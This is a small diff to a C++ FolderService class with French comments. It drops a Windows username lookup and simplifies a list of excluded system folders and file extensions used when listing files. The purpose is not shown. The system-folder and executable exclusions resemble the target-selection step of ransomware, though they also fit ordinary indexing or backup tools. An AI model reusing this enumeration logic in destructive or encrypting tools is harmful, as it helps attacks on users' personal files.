@@ -1,16 +1,13 @@
 #include "Folderservice.h"
 
 FolderService::FolderService() {
-    // Initialisation de l'attribut username
-    m_username = get_username();//boost::system::user_info().username();
-
     // Initialisation de la liste statique des parties de chemins à écarter
     m_exclude_paths.push_back("\\Windows");
     m_exclude_paths.push_back("\\Program Files");
     m_exclude_paths.push_back("\\Program Files (x86)");
     m_exclude_paths.push_back("\\ProgramData");
-    m_exclude_paths.push_back("\\Users\\" + m_username + "\\AppData");
-    m_exclude_paths.push_back("\\Users\\" + m_username + "\\OneDrive");
+    m_exclude_paths.push_back("\\AppData");
+    m_exclude_paths.push_back("\\OneDrive");
     m_exclude_paths.push_back(".exe");
     m_exclude_paths.push_back(".dll");
     m_exclude_paths.push_back(".sys");
@@ -30,13 +27,6 @@ FolderService::FolderService() {
     m_exclude_paths.push_back(".vhd");
     m_exclude_paths.push_back(".bkf");
     m_exclude_paths.push_back(".svg");
-}
-
-std::string FolderService::get_username() {
-    char buffer[1024];
-    DWORD buffer_size = sizeof(buffer);
-    GetUserNameA(buffer, &buffer_size);
-    return buffer;
 }
 
 std::vector<std::string> FolderService::list_files() {
